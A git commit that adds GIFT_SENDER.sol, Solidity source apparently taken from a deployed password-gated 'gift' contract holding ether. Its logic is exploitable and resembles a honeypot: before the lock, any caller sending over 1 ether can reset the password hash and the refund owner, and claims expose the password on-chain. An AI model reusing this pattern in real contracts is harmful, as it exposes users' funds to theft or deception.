4ad9603c3a0efe761fbbcef666d35bb5aa8ce88f
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-16 15:19:27 +0700

    add contract GIFT_SENDER

---
+++ GIFT_SENDER.sol
@@ -0,0 +1,57 @@
+/* 
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract GIFT_SENDER at 0x64669148BCA4F3D1216127A46380a67b37BBf63e
+*/
+pragma solidity ^0.4.19;
+
+contract GIFT_SENDER
+{
+    bool passHasBeenSet = false;
+    
+    address sender;
+    
+    bytes32 public hashPass;
+	
+	function() public payable{}
+    
+    function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}
+    
+    function SetPass(bytes32 hash)
+    public
+    payable
+    {
+        if(!passHasBeenSet&&(msg.value > 1 ether))
+        {
+            hashPass = hash;
+            sender = msg.sender;
+        }
+    }
+    
+    function GetGift(bytes pass)
+    external
+    payable
+    {
+        if(hashPass == sha3(pass))
+        {
+            msg.sender.transfer(this.balance);
+        }
+    }
+    
+    function Revoce()
+    public
+    payable
+    {
+        if(msg.sender==sender)
+        {
+            sender.transfer(this.balance);
+        }
+    }
+    
+    function PassHasBeenSet(bytes32 hash)
+    public
+    {
+        if(hash==hashPass)
+        {
+           passHasBeenSet=true;
+        }
+    }
+}
